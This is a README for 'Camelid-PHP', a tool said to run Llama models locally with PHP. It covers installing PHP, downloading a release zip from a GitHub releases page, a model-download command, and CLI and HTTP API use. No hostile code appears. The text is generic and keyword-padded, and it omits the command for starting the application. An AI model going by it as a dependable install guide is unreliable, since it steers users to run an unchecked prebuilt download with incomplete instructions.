# 🦙 Camelid-PHP - Run Llama models on your machine

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/emmettsluicing122/Camelid-PHP/releases)

Camelid-PHP lets you run artificial intelligence models directly on your computer. You do not need a cloud account or an expensive server. This software uses your computer hardware to generate text, chat with you, and process information. It works entirely offline, which keeps your data private and secure.

## 🛠 Prerequisites

To run this software, your computer needs a few basic tools. You must have the PHP language installed on your system. PHP acts as the engine that runs the application logic. You also need a stable internet connection for the first-time setup to download the necessary model files. Ensure you have at least 5 GB of free space on your hard drive. 

## 📥 Getting the software

You need to download the latest version of the application to your computer.

1. Go to the [official release page](https://github.com/emmettsluicing122/Camelid-PHP/releases).
2. Look for the file ending in `.zip` under the latest release section.
3. Click the file to save it to your Downloads folder.
4. Open your Downloads folder.
5. Right-click the file and select Extract All. Choose a folder where you want to keep the application.

## ⚙️ Setting up your environment

The software requires the PHP runtime to communicate with your processor. Most modern operating systems include simple ways to install this.

1. Open your terminal or command prompt.
2. Type `php -v` and press Enter.
3. If your computer displays a version number, you have PHP ready.
4. If you see an error message, visit the official PHP website to download the installer for your version of Windows.
5. Follow the installation prompts on your screen.
6. Restart your terminal window after the installation finishes.

## 🧠 Downloading the model

The model is the brain of the application. It contains the data that allows the software to understand and generate language. 

1. Navigate to the folder where you extracted the Camelid-PHP files.
2. Right-click inside the folder and select Open in Terminal.
3. Type the following command to begin the download process:
   `php bin/download-model.php --llama3`
4. The system will now download the Llama model. This file is approximately 1.32 GB.
5. Wait for the terminal to confirm the download is complete and verified. 
6. Do not close the window until the process finishes.

## 🚀 Starting the application

Once the model file exists in your folder, you can start the chat interface.

1. In the same terminal window, type the command to start the application.
2. The software will detect the model and prepare your hardware.
3. You will see a prompt appear in your terminal.
4. Type your message and press Enter.
5. The software will generate a response based on the model.

## 💻 Using the command-line interface

Camelid-PHP offers a command-line tool for users who prefer working without a graphical interface. This is useful for testing how the model responds to specific inputs. You can pass your questions directly through the command line to get instant text outputs. The application keeps a history of your conversation during the session, allowing for follow-up questions.

## 🌐 Connecting through the HTTP API

Developers can use the built-in HTTP API to connect other programs to the model. The application runs a local web server that listens for requests. You can send data to this server using standard web protocols. This feature makes it possible to build custom tools or plugins that use the power of the Llama model without writing complex backend code.

## 📈 Improving performance

The software performs matrix calculations to generate responses. These calculations require processing power. To improve the speed of responses, ensure that your computer has enough available memory. Close heavy applications, such as video editors or web browsers with many tabs open, while running the model. This allows the software to allocate more resources to the generation process.

## 🛡 Security and privacy

Since this application runs locally, no data leaves your machine. Your conversations stay within the folder on your hard drive. The software does not require an active internet connection after the initial model download. You can disconnect your machine from the network entirely and the software will continue to function normally.

## 🔧 Troubleshooting common issues

If the application fails to start, verify that the file path in your terminal matches the folder where you extracted the software. Check that the model file finished downloading without interruptions. If you see errors related to PHP, ensure that your PHP version is 8.2 or newer. You can check your version at any time by running the command `php -v`.

Keywords: Llama, artificial intelligence, local model, PHP, command-line, private AI, natural language processing